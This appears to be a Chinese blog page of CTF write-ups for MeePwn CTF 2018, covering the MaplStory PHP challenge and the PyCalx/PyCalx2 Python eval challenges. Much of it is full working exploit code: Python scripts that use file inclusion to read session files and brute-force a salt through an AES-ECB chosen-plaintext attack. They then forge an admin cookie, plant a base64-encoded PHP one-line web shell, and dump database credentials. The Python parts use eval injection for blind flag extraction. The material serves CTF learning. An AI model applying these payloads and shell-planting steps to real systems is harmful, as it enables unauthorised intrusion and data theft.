可在Cookie里找到。尝试读取SESSION文件：\n1 http://178.128.87.16/index.php?page=/var/lib/php/sessions/sess_8es749ivbfetvsmsc0ggthr2e5 其中是序列化后的$_SESSION 和明文的操作记录，这些内容在后面会大有用处。\nCPA猜解salt login.php 阅读login.php 并跟入相关文件，可以看到有多处用到$salt 变量，其地位非常关键。\n首先是从单独的表mapl_config 中读出值。\n1 2 3 4 5 6 7 8 9 10 $configRow=config_connect($conn); $salt=$configRow[\u0026#39;mapl_salt\u0026#39;]; $key=$configRow[\u0026#39;mapl_key\u0026#39;]; /* function config_connect($conn) { $config=mysqli_query($conn,\u0026#34;SELECT * FROM mapl_config\u0026#34;); return mysqli_fetch_array($config); } */ 如果登陆成功就将用户名和邮箱加盐加密存储的$_SESSION 变量里。并且将admin /user 字符串加盐加密存储在$_COOKIE['_role'] 变量中，用以标识用户身份。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 if( $count === 1 \u0026amp;\u0026amp; $row[\u0026#39;userPass\u0026#39;]===$password ) //登陆成功 { $secure_email=encryptData($row[\u0026#39;userEmail\u0026#39;],$salt,$key); $secure_name=encryptData($row[\u0026#39;userName\u0026#39;],$salt,$key); $log_content=\u0026#39;[\u0026#39;.date(\u0026#34;h:i:sa\u0026#34;).\u0026#39; GMT+7] Logged In\u0026#39;; $_SESSION[\u0026#39;character_name\u0026#39;] = $secure_name; $_SESSION[\u0026#39;user\u0026#39;] = $secure_email; $_SESSION[\u0026#39;action\u0026#39;]=$log_content; if ($row[\u0026#39;userIsAdmin\u0026#39;]===\u0026#39;1\u0026#39;) { $data=\u0026#39;admin\u0026#39;.$salt; $role=hash(\u0026#39;sha256\u0026#39;, $data); setcookie(\u0026#39;_role\u0026#39;,$role); } else { $data=\u0026#39;user\u0026#39;.$salt; $role=hash(\u0026#39;sha256\u0026#39;, $data); setcookie(\u0026#39;_role\u0026#39;,$role);\t} header(\u0026#34;Location: ?page=home.php\u0026#34;); } /* function encryptData($data,$salt,$key) { $encrypt=openssl_encrypt($data.$salt,\u0026#34;AES-128-ECB\u0026#34;,$key); $raw=base64_decode($encrypt); $final=implode(unpack(\u0026#34;H*\u0026#34;, $raw)); return $final; } */ setting.php 再查看setting.php ，这个文件实现了修改用户名页面的功能 。只要修改后的名字不长于22个字符，就使用mysqli_real_escape_string 处理并更新记录（避免SQL注入）。会被编码的字符有的 NUL（ASCII 0）、\\n、\\r、\\、\u0026rsquo;、\u0026quot; 和 Control-Z。\n1 2 3 4 5 6 7 8 9 10 11 if(strlen($_POST[\u0026#39;name\u0026#39;])\u0026lt;=22){ $name=mysqli_real_escape_string($conn,$_POST[\u0026#39;name\u0026#39;]); $query=\u0026#34;UPDATE users SET userName=\u0026#39;$name\u0026#39; WHERE userEmail=\u0026#39;$mail\u0026#39;\u0026#34;; $res2=mysqli_query($conn,$query); $userRow2=mysqli_fetch_array($res2); $secure_name=encryptData($name,$salt,$key); $_SESSION[\u0026#39;character_name\u0026#39;] = $secure_name; $log_content=\u0026#39;[\u0026#39;.date(\u0026#34;h:i:sa\u0026#34;).\u0026#39; GMT+7] Change character name\u0026#39;; $_SESSION[\u0026#39;action\u0026#39;]=$log_content; header(\u0026#34;Refresh:0\u0026#34;); } 所有加密操作用的是同一个$salt ，加上上述包含Session文件的操作，就会有构造任意明文获取对应密文的可能。最重要的，加密方式采用了AES-128-ECB ，ECB 全称Electronic Codebook （电码本），顾名思义，这种模式的特点就是相同的明文块加密后会得到相同的密文块。\n这里采用128位的分组形式，也就是每十六字节一个明文块。举栗说明：\n如果用户名是findneo 七个字节，$salt 是xianzhi 八个字节，那么加密过程就是把findneoxianzhi 共十五个字节作为一个分组去加密，缺一个字节按算法padding。\n如果用户名是hifindneo 共九个字节，那么加密过程就是对hifindne 和oxianzhi 作为两个分组加密。\n我们可以在SETTING 页面修改用户名来改变明文，然后使用文件包含读到Session文件内容来获取密文，这就是一个完整的选择明文攻击过程。\n利用 怎么攻击呢？比如用户名是findneo ，（我们还不知道$salt 是xianzhi ） ，那么加密的第一个明文分组是findneox ，记录下$_SESSION['character_name'] 的前32个字节十六进制数，也就是密文的第一个分组。\n然后依次改变用户名为findneoa 、findneob 、.etc，并记录密文第一个分组。直到用户名为findneox 时发现密文第一个分组与用户名为findneo 时的相同。根据ECB模式的特点，就能知道$salt 的第一个字节为x ，事实上也确实如此。\n测试发现用户名长15个字符时，$_SESSION['character_name'] 有64字节十六进制数，也就是加盐加密后是32个字符，用户名长为16个字符时，$_SESSION['character_name'] 有96字节，也就加盐加密后有48个字符。这说明$salt 长为16个字节。\n然后就可以按照以上原理猜解$salt ，伪造$_COOKIE['_role'] ，成为管理员。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 # -*- coding: utf-8 -*- # by https://findneo.github.io/ import requests from bs4 import BeautifulSoup import string import hashlib url = \u0026#34;http://178.128.87.16/\u0026#34; cookie = dict( PHPSESSID=\u0026#39;t9p07a1qt2plbcqp8tpkib4794\u0026#39;, # _role=\u0026#39;8e1c59c3fdd69afbc97fcf4c960aa5c5e919e7087c07c91cf690add608236cbe\u0026#39; ) def read_sess(): r = requests.get( url + \u0026#34;?page=/var/lib/php/sessions/sess_\u0026#34; + cookie[\u0026#39;PHPSESSID\u0026#39;], cookies=cookie) return r.content def get_sess_character_name(): \u0026#34;\u0026#34;\u0026#34;read_sess(): character_name|s:64:\u0026#34;6269cb047bbbd0802cd7b882700591c6f6ace10234be4243997282e7c467e820\u0026#34;; user|s:64:\u0026#34;82f0cac5c0591592eaccfdac48f3e3656c264c7a73f97aeea603461254e3ac38\u0026#34;; action|s:40:\u0026#34;[12:04:21pm GMT+7] Change character name\u0026#34;; \u0026#34;\u0026#34;\u0026#34; character_name = read_sess().split(\u0026#39;;\u0026#39;)[0].split(\u0026#34;:\u0026#34;)[-1][1:-1] return character_name def change_name(character_name): payload = dict(name=character_name, submit=\u0026#39;Edit\u0026#39;) r = requests.post(url + \u0026#34;?page=setting.php\u0026#34;, cookies=cookie, data=payload) def whoami(): r = requests.get(url + \u0026#34;?page=home.php\u0026#34;, cookies=cookie) s = BeautifulSoup(r.content, \u0026#39;lxml\u0026#39;) print s.h2.get_text().split(\u0026#39;\\n\u0026#39;)[0] def change_and_check(name): change_name(name) # whoami() return get_sess_character_name() def crack_salt(): junk = \u0026#39;x\u0026#39; * 16 salt = \u0026#39;\u0026#39; s = \u0026#39;ms_g00d_0ld_g4m3\u0026#39; + string.printable for i in range(15, -1, -1): cmp = change_and_check(junk[:i])[:32] if i == 0: # 如果i==0，无法修改用户名，实际上salt对应的就是第二个密文块，直接取即可 cmp = change_and_check(junk)[32:64] for j in s: if cmp == change_and_check(junk[:i] + salt + j)[:32]: salt += j print salt break return salt salt = crack_salt() 爆破得到$salt 为ms_g00d_0ld_g4m3 ，然后计算出admin 用户的Cookie为 hashlib.sha256('admin' + salt).hexdigest() 也就是_role='a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054' 。\n可使用Fiddler的Filters功能设置请求头为PHPSESSID=8es749ivbfetvsmsc0ggthr2e5; _role=8e1c59c3fdd69afbc97fcf4c960aa5c5e919e7087c07c91cf690add608236cbe ，权限上升为ADMIN。\n以Cookie为跳板的Session文件包含 admin.php 注意到Session文件中有部分明文信息，记录关于上一次的操作。每一次操作都会记录，但只有admin.php 中写入的内容存在可控变量：\n1 2 3 4 5 6 7 8 9 10 if ( isset($_POST[\u0026#39;pet\u0026#39;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#39;pet\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;email\u0026#39;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#39;email\u0026#39;]) ) { $dir=\u0026#39;./upload/\u0026#39;.md5($salt.$_POST[\u0026#39;email\u0026#39;]).\u0026#39;/\u0026#39;; give_pet($dir,$_POST[\u0026#39;pet\u0026#39;]); if(check_available_pet($_POST[\u0026#39;pet\u0026#39;])) { $log_content=\u0026#39;[\u0026#39;.date(\u0026#34;h:i:sa\u0026#34;).\u0026#39; GMT+7] gave \u0026#39;.$_POST[\u0026#39;pet\u0026#39;].\u0026#39; to player \u0026#39;.search_name_by_mail($conn,$_POST[\u0026#39;email\u0026#39;]); $_SESSION[\u0026#39;action\u0026#39;]=$log_content; } } 其中的search_name_by_mail($conn,$_POST['email']) 正是用户名，而这是可修改的。所以只要在CHARACTER 页面执行一次送宠物给某个用户的操作，Session文件中就会出现该用户的用户名。而如果用户名是PHP代码，就会被执行。\n用户名修改有哪些限制？\n首先是文件包含 小节提到的所有GET ，POST 参数都必须经过的黑名单过滤。\n1 2 3 4 5 function bad_words($value){\t$too_bad=\u0026#34;/(fuck|bakayaro|ditme|bitch|caonima|idiot|bobo|tanga|pin|gago|tangina|\\/\\/|damn|noob|pro|nishigou|stupid|ass|\\(.+\\)|`.+`|vcl|cyka|dcm)/is\u0026#34;; $value = preg_replace($too_bad, str_repeat(\u0026#34;*\u0026#34;,3) ,$value); return $value; } # |\\/\\/|\\(.+\\)|`.+`| 比较重要，意味着伪协议、函数、shell都不能直接使用。 然后是setting.php （代码见CPA猜解salt 小节）中要求的不大于22个字符。\ncharacter.php 所有功能中唯一一个直接写文件的操作在和CHARACTER 页面，同样需经过黑名单过滤，并且要求小于20个字符。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 if(isset($_POST[\u0026#39;command\u0026#39;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#39;command\u0026#39;])) { if(strlen($_POST[\u0026#39;command\u0026#39;])\u0026gt;=20) { echo \u0026#39;\u0026lt;center\u0026gt;\u0026lt;strong\u0026gt;Too Long\u0026lt;/strong\u0026gt;\u0026lt;/center\u0026gt;\u0026#39;; } else { save_command($mail,$salt,$_POST[\u0026#39;command\u0026#39;]); header(\u0026#34;Refresh:0\u0026#34;); } } /* function save_command($email,$salt,$data){ $dir=\u0026#39;./upload/\u0026#39;.md5($salt.$email); file_put_contents($dir.\u0026#39;/command.txt\u0026#39;, $data); } */ 利用 思路 全局共有两处可以修改文件，可以修改用户名以修改Session文件，也可在CHARACTER 页面修改command.txt ，但两处都是由GET 或POST 传的参，参数被黑名单过滤导致无法直接发挥作用。\n考虑到COOKIE没有被过滤，可以用作跳板，在Session文件中包含Cookie，在command.txt 写入编码后的无害字符串，在Cookie写入利用伪协议读取 command.txt 并解码的语句，就成功向Session文件写入了一句话。\n其实从哪个文件经由哪个变量跳到哪个文件是有多种可能的，但本题受限于长度这很可能是唯一的解法。\n步骤 在SETTING处修改用户名为\u0026lt;?=include\u0026quot;$_COOKIE[a] 在Fiddler的Filters处的Cookie后面添加上一条a=php://filter/convert.base64-decode/resource=upload/ac8d37347a056bad2a852e4ef40de28a/command.txt 在character处给宠物发一条命令 PD89YCRfR0VUW2ZdYDs 从而写入command.txt 1 # PD89YCRfR0VUW2ZdYDs 可解码为 \u0026lt;?=`$_GET[f]`; 在admin处给自己送一只宠物 使执行语句\n1 $log_content=\u0026#39;[\u0026#39;.date(\u0026#34;h:i:sa\u0026#34;).\u0026#39; GMT+7] gave \u0026#39;.$_POST[\u0026#39;pet\u0026#39;].\u0026#39; to player \u0026#39;.search_name_by_mail($conn,$_POST[\u0026#39;email\u0026#39;]); 而其中的search_name_by_mail($conn,$_POST['email'] 正是用户名\u0026lt;?=include\u0026quot;$_COOKIE[a]\n所以包含session文件就可以把Cookie里的变量a 包含进来，而a又是command.txt解码后的结果，也就是一句话木马。这时就可以以f为密码传入任意命令了。\n读到数据库配置文件 读到配置文件dbconnect.php 1 2 3 4 5 6 7 8 9 \u0026lt;?php define(\u0026#39;DBHOST\u0026#39;, \u0026#39;localhost\u0026#39;); define(\u0026#39;DBUSER\u0026#39;, \u0026#39;mapl_story_user\u0026#39;); define(\u0026#39;DBPASS\u0026#39;, \u0026#39;tsu_tsu_tsu_tsu\u0026#39;); define(\u0026#39;DBNAME\u0026#39;, \u0026#39;mapl_story\u0026#39;); $conn = mysqli_connect(DBHOST,DBUSER,DBPASS,DBNAME); if ( !$conn ) { die(\u0026#34;Connection failed : \u0026#34; . mysql_error()); } 然后执行命令 1 2 3 echo \u0026#39;SELECT * FROM mapl_config;\u0026#39;| mysql -umapl_story_user -ptsu_tsu_tsu_tsu mapl_story 或 mysql -e\u0026#39;select * from mapl_config\u0026#39; -umapl_story_user -ptsu_tsu_tsu_tsu mapl_story 脚本 也可参考脚本理清利用过程：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 # -*- coding: utf-8 -*- # by https://findneo.github.io/ import requests, hashlib, base64 def change_name(character_name): payload = dict(name=character_name, submit=\u0026#39;Edit\u0026#39;) r = requests.post(url + \u0026#34;?page=setting.php\u0026#34;, cookies=cookie, data=payload) def give_pet(user_email): payload = dict(pet=\u0026#34;babydragon\u0026#34;, email=user_email, submit=\u0026#34;Give\u0026#34;) r = requests.post(url + \u0026#39;?page=admin.php\u0026#39;, cookies=cookie, data=payload) return r.content def command(cmd=\u0026#34;testcmd\u0026#34;): payload = dict(command=cmd, submit=\u0026#34;Send\u0026#34;) r = requests.post( url + \u0026#34;?page=character.php\u0026#34;, cookies=cookie, data=payload) def shell(cmd=\u0026#39;uname\u0026#39;): payload = dict( page=\u0026#34;/var/lib/php/sessions/sess_\u0026#34; + cookie[\u0026#39;PHPSESSID\u0026#39;], f=cmd) r = requests.get(url, cookies=cookie, params=payload) return r.content # edit your cookie[\u0026#39;PHPSESSID\u0026#39;] \u0026amp; user_email to run this script url = \u0026#34;http://178.128.87.16/\u0026#34; user_email = \u0026#34;ojbk@qq.com\u0026#34; salt = \u0026#39;ms_g00d_0ld_g4m3\u0026#39; cookie = dict( PHPSESSID=\u0026#39;8es749ivbfetvsmsc0ggthr2e5\u0026#39;, _role=\u0026#39;a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054\u0026#39;, a=\u0026#34;php://filter/convert.base64-decode/resource=upload/%s/command.txt\u0026#34; % hashlib.md5(salt + user_email).hexdigest()) change_name(\u0026#39;\u0026lt;?=include\u0026#34;$_COOKIE[a]\u0026#39;) # 修改用户名使读Session文件时包含进Cookie[\u0026#39;a\u0026#39;]，即command.txt得base64解码 cmd = base64.b64encode(\u0026#34;\u0026lt;?=`$_GET[f]`;\u0026#34;) #\u0026#39;PD89YCRfR0VUW2ZdYDs=\u0026#39; command(cmd[:19]) # 往command.txt写入base64编码的shell，缺少最后一个等号也可正常解码 give_pet(user_email) # 使Session文件中的action值为\u0026#34;Give $pet to player $username\u0026#34; cmd = \u0026#34;mysql -e\u0026#39;select * from mapl_config\u0026#39; -umapl_story_user -ptsu_tsu_tsu_tsu mapl_story\u0026#34; print shell(cmd) # mapl_salt mapl_key mapl_now_get_your_flag # ms_g00d_0ld_g4m3 You_Never_Guess_This_Tsug0d_1337 MeePwnCTF{__Abus1ng_SessioN_Is_AlwAys_C00L_1337!___} 另一种思路：拼接$_SESSION 变量 另外， 这篇文章 里提供的一种拼接$_SESSION 变量的做法虽不比前者综合利用多处缺陷的优雅，但最大化地利用了单点的缺陷，很有创意，值得学习。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 # -*- coding: utf-8 -*- # by https://findneo.github.io/ import requests, hashlib, base64 def change_name(character_name): payload = dict(name=character_name, submit=\u0026#39;Edit\u0026#39;) r = requests.post(url + \u0026#34;?page=setting.php\u0026#34;, cookies=cookie, data=payload) def give_pet(user_email): payload = dict(pet=\u0026#34;babydragon\u0026#34;, email=user_email, submit=\u0026#34;Give\u0026#34;) r = requests.post(url + \u0026#39;?page=admin.php\u0026#39;, cookies=cookie, data=payload) return r.content def shell(cmd=\u0026#39;uname\u0026#39;): payload = dict( page=\u0026#34;/var/lib/php/sessions/sess_\u0026#34; + cookie[\u0026#39;PHPSESSID\u0026#39;], f=cmd) r = requests.get(url, cookies=cookie, params=payload) return r.content # edit your cookie[\u0026#39;PHPSESSID\u0026#39;] \u0026amp; user_email to run this script url = \u0026#34;http://178.128.87.16/\u0026#34; user_email = \u0026#34;mapl@qq.com\u0026#34; salt = \u0026#39;ms_g00d_0ld_g4m3\u0026#39; cookie = dict( PHPSESSID=\u0026#39;8es749ivbfetvsmsc0ggthr2e5\u0026#39;, _role=\u0026#39;a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054\u0026#39;, ) def do(s): change_name(s) give_pet(user_email) print s print shell() payload1 = \u0026#34;\u0026#34;\u0026#34; \u0026lt;?=$_SESSION[a]=\u0026#39;*/\u0026#39;?\u0026gt; \u0026lt;?=$_SESSION[a].=\u0026#39;;\u0026#39;?\u0026gt; \u0026lt;?=$_SESSION[a].=\u0026#39;\u0026#34;\u0026#39;?\u0026gt; \u0026lt;?=$_SESSION[a].=\u0026#39;\u0026lt;\u0026#39;?\u0026gt; \u0026lt;?=$_SESSION[a].=\u0026#39;?\u0026#39;/* \u0026lt;?=$_SESSION[a].=\u0026#39;=\u0026#39;/* \u0026lt;?=$_SESSION[a].=\u0026#39; \u0026#39;/* \u0026#34;\u0026#34;\u0026#34; payload2 = \u0026#39;`echo PD89YCRfR0VUWzFdYDsK|base64 -d \u0026gt;\u0026gt; upload/%s/command.txt`\u0026#39; % hashlib.md5( salt + user_email).hexdigest() payload3 = \u0026#34;\u0026#34;\u0026#34; \u0026lt;?=$_SESSION[a].=\u0026#39;\u0026#39;/* \u0026lt;?=$_SESSION[a].=\u0026#39;?\u0026#39;/* \u0026lt;?=$_SESSION[a].=\u0026#39;\u0026gt;\u0026#39;/* \u0026lt;?=$_SESSION[a]?\u0026gt; \u0026#34;\u0026#34;\u0026#34; def xxx(): for p in payload1.split(\u0026#39;\\n\u0026#39;)[1:-1]: do(p) for c in payload2: p = \u0026#34;\u0026lt;?=$_SESSION[a].=\u0026#39;%s\u0026#39;/*\u0026#34; % c do(p) for p in payload3.split(\u0026#39;\\n\u0026#39;)[1:-1]: do(p) xxx() print hashlib.md5(salt + user_email).hexdigest() # 可通过运行结果理解payload的巧妙 # 结果存放在 # https://github.com/findneo/ctfgodown/blob/master/20180718-Meepwn%20CTF%20Quals%202018/WEB/maplStory_SESSION_CONCAT_result.txt # shell at # http://178.128.87.16/?page=upload/e500ec6d3d2b69fda8ff11b5b53b5ee2/command.txt\u0026amp;1=ls 参考链接 https://ctftime.org/writeup/10418\nMeePwn CTF 2018 Qual - Maple Story\n","permalink":"https://ret2neo.cn/post/180721meepwnmaplstory/","summary":"本文首发 先知社区 ，转载请注明链接。\n本题考察PHP源码审计。主要有两个缺陷：使用ECB模式进行AES加密导致的CPA（选择明文攻击）和 文件包含。有两处可以向文件写入内容以供包含，但均被过滤，最终通过以未被过滤的Cookie为跳板连接两处文件包含来写入Shell。文末还介绍了一种深入利用一处文件包含getshell的解法。\n概览 打开 http://178.128.87.16 是一个登陆页面，注册账户后有四个页面，HOME 是欢迎页，CHARACTER 页可以和宠物角色互动，但账户刚注册完是没有宠物的，需要获取ADMIN权限后自行添加， SETTING 页可以修改用户名和选择头像，GAME 页是一个Flash小游戏，和本题无关。\n题目提供了源码下载，可以从 这里 或 备用地址 下载。\n文件包含 index.php index.php 文件中有如下语句，显然存在文件包含。\n1 2 3 4 if(isset($_GET[\u0026#39;page\u0026#39;]) \u0026amp;\u0026amp; !empty($_GET[\u0026#39;page\u0026#39;])) { include($_GET[\u0026#39;page\u0026#39;]); } 但所有 GET 和POST 提交的参数都会被删除掉敏感字符串，其中 // 、(.+) 和 `` 是比较值得注意的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 function bad_words($value) { //My A.I TsuGo show me that when player using these words below they feel angry, so i decide to censor them.","title":"Meepwn2018：MaplStory——以Cookie为跳板的Session文件包含"},{"content":"本文首发 先知社区 ，转载请注明链接。\nPyCalx This code is supposed to be unexploitable :/ another pyjail? [Source] Try this or this Notice: The flag may contain non alphabetic characters (but still printable)\n本题由Python的 eval() 函数参数可控且直接拼接引发的注入，采用二分法盲注。\nserver.py源码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 #!/usr/bin/env python import cgi import sys from html import escape FLAG = open(\u0026#39;/var/www/flag\u0026#39;, \u0026#39;r\u0026#39;).read() OK_200 = \u0026#34;some HTML code\u0026#34; print(OK_200) arguments = cgi.FieldStorage() if \u0026#39;source\u0026#39; in arguments: source = arguments[\u0026#39;source\u0026#39;].value else: source = 0 if source == \u0026#39;1\u0026#39;: print(\u0026#39;\u0026lt;pre\u0026gt;\u0026#39; + escape(str(open(__file__, \u0026#39;r\u0026#39;).read())) + \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39;) if \u0026#39;value1\u0026#39; in arguments and \u0026#39;value2\u0026#39; in arguments and \u0026#39;op\u0026#39; in arguments: def get_value(val): val = str(val)[:64] if str(val).isdigit(): return int(val) blacklist = [\u0026#39;(\u0026#39;, \u0026#39;)\u0026#39;, \u0026#39;[\u0026#39;, \u0026#39;]\u0026#39;, \u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;] # I don\u0026#39;t like tuple, list and dict. if val == \u0026#39;\u0026#39; or [c for c in blacklist if c in val] != []: print(\u0026#39;\u0026lt;center\u0026gt;Invalid value\u0026lt;/center\u0026gt;\u0026#39;) sys.exit(0) return val def get_op(val): val = str(val)[:2] list_ops = [\u0026#39;+\u0026#39;, \u0026#39;-\u0026#39;, \u0026#39;/\u0026#39;, \u0026#39;*\u0026#39;, \u0026#39;=\u0026#39;, \u0026#39;!\u0026#39;] if val == \u0026#39;\u0026#39; or val[0] not in list_ops: print(\u0026#39;\u0026lt;center\u0026gt;Invalid op\u0026lt;/center\u0026gt;\u0026#39;) sys.exit(0) return val op = get_op(arguments[\u0026#39;op\u0026#39;].value) value1 = get_value(arguments[\u0026#39;value1\u0026#39;].value) value2 = get_value(arguments[\u0026#39;value2\u0026#39;].value) if str(value1).isdigit() ^ str(value2).isdigit(): print(\u0026#39;\u0026lt;center\u0026gt;Types of the values don\\\u0026#39;t match\u0026lt;/center\u0026gt;\u0026#39;) sys.exit(0) calc_eval = str(repr(value1)) + str(op) + str(repr(value2)) print( \u0026#39;\u0026lt;div class=container\u0026gt;\u0026lt;div class=row\u0026gt;\u0026lt;div class=col-md-2\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;div class=\u0026#34;col-md-8\u0026#34;\u0026gt;\u0026lt;pre\u0026gt;\u0026#39; ) print(\u0026#39;\u0026gt;\u0026gt;\u0026gt;\u0026gt; print(\u0026#39; + escape(calc_eval) + \u0026#39;)\u0026#39;) try: result = str(eval(calc_eval)) if result.isdigit() or result == \u0026#39;True\u0026#39; or result == \u0026#39;False\u0026#39;: print(result) else: print( \u0026#34;Invalid\u0026#34; ) # Sorry we don\u0026#39;t support output as a string due to security issue. except: print(\u0026#34;Invalid\u0026#34;) print(\u0026#39;\u0026gt;\u0026gt;\u0026gt; \u0026lt;/pre\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;\u0026#39;) 大意如下：\ncgi会处理source，value1，value2，op四个参数。 如果source=1则打印源代码。 value1，value2，op三个参数都有值时进一步处理。 value1，value2至少1个字符，至多64个，且不包含黑名单()[]'\u0026quot; 里的字符。 op至少1个字符，至多2个，且首字符必须在白名单+-*/=! 里。 value1,value2要么都是只包含[0-9]，要么都包含其他字符。 执行str(eval(str(repr(value1)) + str(op) + str(repr(value2)))) ，且只有结果是bool值或只包含[0-9] 时才会输出。 注：repr返回对象的可打印形式，和反引号包裹效果一致，对大多数类型，他会返有一个字符串，使其可以作为代码直接传入eval执行。 解题思路：op 允许两个字符，且第二个字符是任意的，那么如果是一个单引号，就能混淆代码和数据，起到类似SQL注入的效果。\n1 2 3 4 \u0026gt;\u0026gt;\u0026gt; print(str(repr(\u0026#34;a\u0026#34;))+str(\u0026#34;+\u0026#34;)+str(repr(\u0026#34;b\u0026#34;))) \u0026#39;a\u0026#39;+\u0026#39;b\u0026#39; \u0026gt;\u0026gt;\u0026gt; print(str(repr(\u0026#34;a\u0026#34;))+str(\u0026#34;+\u0026#39;\u0026#34;)+str(repr(\u0026#34;\u0026lt; b#\u0026#34;))) \u0026#39;a\u0026#39;+\u0026#39;\u0026#39;\u0026lt; b#\u0026#39; 解题脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 import requests, re def calc(v1, v2, op, s): u = \u0026#34;http://178.128.96.203/cgi-bin/server.py?\u0026#34; payload = dict(value1=v1, value2=v2, op=op, source=s) # print payload r = requests.get(u, params=payload) # print r.url res = re.findall(\u0026#34;\u0026lt;pre\u0026gt;\\n\u0026gt;\u0026gt;\u0026gt;\u0026gt;([\\s\\S]*)\\n\u0026gt;\u0026gt;\u0026gt; \u0026lt;\\/pre\u0026gt;\u0026#34;, r.content)[0].split(\u0026#39;\\n\u0026#39;)[1] assert (res != \u0026#39;Invalid\u0026#39;) return res == \u0026#39;True\u0026#39; # print r.content def check(mid): s = flag + chr(mid) return calc(v1, v2, op, s) def bin_search(seq=xrange(0x20, 0x80), lo=0, hi=None): assert (lo \u0026gt;= 0) if hi == None: hi = len(seq) while lo \u0026lt; hi: mid = (lo + hi) // 2 # print lo, mid, hi, \u0026#34;\\t\u0026#34;, if check(seq[mid]): hi = mid else: lo = mid + 1 return seq[lo] flag = \u0026#39;\u0026#39; v1, v2, op, s = \u0026#39;x\u0026#39;, \u0026#34;+FLAG\u0026lt;value1+source#\u0026#34;, \u0026#34;+\u0026#39;\u0026#34;, \u0026#39;\u0026#39; while (1): flag += chr(bin_search() - 1) print flag # MeePwnCTF{python3.66666666666666_([_((you_passed_this?]]]]]])} PyCalx2 You should solve PyCalx first.\nhttp://206.189.223.3/cgi-bin/server.py?source=1\nserver.py 只改动了一行代码，将 op = get_op(arguments['op'].value) 变成了 op = get_op(get_value(arguments['op'].value)) ，也就是说将op 参数也进行了黑名单过滤，于是 op 的第二个字符就不能是单引号，第一题的方法也就失效了。\n结合题目提示和第一题的flag去寻找Python3.6的新特性，用到了这个 f-string ，详见PEP 498 \u0026ndash; Literal String Interpolation 。简言之就是可以在字符串中方便地直接插入表达式，以f 开头，表达式插在大括号{} 里，在运行时表达式会被计算并替换成对应的值。\n本题主要是利用这个特性在字符串里插入比较的表达式，剩下的就和上题一样了。插法不尽相同，CTF Time上的WP里有这么两种，相信还可以有其他的方法：\n1 2 3 4 5 6 \u0026gt;\u0026gt;\u0026gt; str(repr(\u0026#39;T\u0026#39;))+str(\u0026#39;+f\u0026#39;)+str(repr(\u0026#39;ru{FLAG\u0026lt;source or 14:x}\u0026#39;)) # 14的十六进制表示时\u0026#39;e\u0026#39; \u0026#34;\u0026#39;T\u0026#39;+f\u0026#39;ru{FLAG\u0026lt;source or 14:x}\u0026#39;\u0026#34; \u0026gt;\u0026gt;\u0026gt; eval(str(repr(\u0026#39;T\u0026#39;))+str(\u0026#39;+f\u0026#39;)+str(repr(\u0026#39;ru{1 or 14:x}\u0026#39;))) \u0026#39;Tru1\u0026#39; # 返回Invalid \u0026gt;\u0026gt;\u0026gt; eval(str(repr(\u0026#39;T\u0026#39;))+str(\u0026#39;+f\u0026#39;)+str(repr(\u0026#39;ru{0 or 14:x}\u0026#39;))) \u0026#39;True\u0026#39; 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026gt;\u0026gt;\u0026gt; str(repr(\u0026#39;Tru\u0026#39;))+str(\u0026#39;+f\u0026#39;)+str(repr(\u0026#39;{sys.exit.__name__:{FLAG\u0026lt;source:1}.1}\u0026#39;)) \u0026#34;\u0026#39;Tru\u0026#39;+f\u0026#39;{sys.exit.__name__:{FLAG\u0026lt;source:1}.1}\u0026#39;\u0026#34; # {FLAG\u0026lt;source:1}的值相当于printf(\u0026#34;%1f\u0026#34;,FLAG\u0026lt;source)的结果，有0和1两种可能。 #这边sys.exit.__name__等价于字符串\u0026#39;exit\u0026#39;，考虑到已经import escape，直接用escape.__name__也可。 \u0026gt;\u0026gt;\u0026gt; eval(str(repr(\u0026#39;Tru\u0026#39;))+str(\u0026#39;+f\u0026#39;)+str(repr(\u0026#39;{sys.exit.__name__:{1:1}.1}\u0026#39;))) \u0026#39;True\u0026#39; \u0026gt;\u0026gt;\u0026gt; eval(str(repr(\u0026#39;Tru\u0026#39;))+str(\u0026#39;+f\u0026#39;)+str(repr(\u0026#39;{sys.exit.__name__:{0:1}.1}\u0026#39;))) #报错，返回Invalid Traceback (most recent call last): File \u0026#34;\u0026lt;stdin\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; ValueError: \u0026#39;=\u0026#39; alignment not allowed in string format specifier \u0026gt;\u0026gt;\u0026gt; 